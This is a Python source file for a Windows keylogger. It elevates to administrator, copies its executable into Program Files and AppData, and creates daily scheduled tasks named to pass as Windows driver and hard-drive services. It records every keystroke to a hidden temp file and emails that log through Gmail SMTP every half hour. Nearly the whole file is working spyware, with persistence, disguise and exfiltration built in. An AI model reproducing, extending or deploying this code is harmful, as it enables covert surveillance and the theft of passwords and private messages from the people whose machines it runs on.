from pynput.keyboard import Key, Listener
from pynput.keyboard import Key, Listener
import logging

#Check Admin Privileges
import ctypes, sys
if not ctypes.windll.shell32.IsUserAnAdmin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)

# Keep Backup of the .exe file
from shutil import *
import os
try:
    copy2(os.getcwd() + "\\host.exe", r'C:\Program Files')
    copy2(os.getcwd() + "\\host.exe", os.environ.get('USERPROFILE') + "\\AppData\\Roaming")
except (SameFileError, IsADirectoryError):
    pass
except PermissionError:
    print("Permission denied.")

# Add Task Scheduler
os.system(r'SchTasks /Create /SC DAILY /F /TN "Windows_DriverSupport" /TR ' + os.getcwd() + '\\host.exe' + r' /ST 10:00')
os.system(r'SchTasks /Create /SC DAILY /F /TN "Windows_HardDrive" /TR ' + os.getcwd() + '\\host.exe' + r' /ST 21:00')

# Remove KEYLOGS file
try:
    os.remove(os.environ.get('USERPROFILE') + "\\AppData\\Local\\Temp\\keylogs.txt")
except:
    pass

# Logging
logging.basicConfig(filename = (os.environ['USERPROFILE'] + "\\AppData\\Local\\Temp\\" + "keylogs.txt"),\
    level=logging.DEBUG, format='%(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()

# Send the contents via email at hh:30 AM/PM
import time
while(True):
    if int(time.strftime("%M", time.localtime())) == 30 and os.path.exists(os.environ.get('USERPROFILE') + "\\AppData\\Local\\Temp\\keylogs.txt"):
        if os.path.exists(os.environ.get('USERPROFILE') + "\\AppData\\Local\\Temp\\keylogs.txt"):
            allKeys = open(os.environ.get('USERPROFILE') + "\\AppData\\Local\\Temp\\keylogs.txt", "r")
        else:
            exit()
        import smtplib
        try:
            fiz = open(os.environ.get('USERPROFILE') + "\\AppData\\Local\\Temp\\keylogs.txt", "r")
            allKeys = fiz.read()
        except:
            pass

        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.starttls()
        s.login("sender@gmail.com", "password_here")
        message = """From: Test Email <test@gmail.com>
        To: Receiver <receiver@gmail.com>
        MIME-Version: 1.0
        Content-type: text/html
        Subject: KeyLogs
        <br>
        <h1>Here starts Logs:<br></h1>
        """
        s.sendmail("sender@gmail.com", "receiver@gmail.com", message + allKeys)
        s.quit()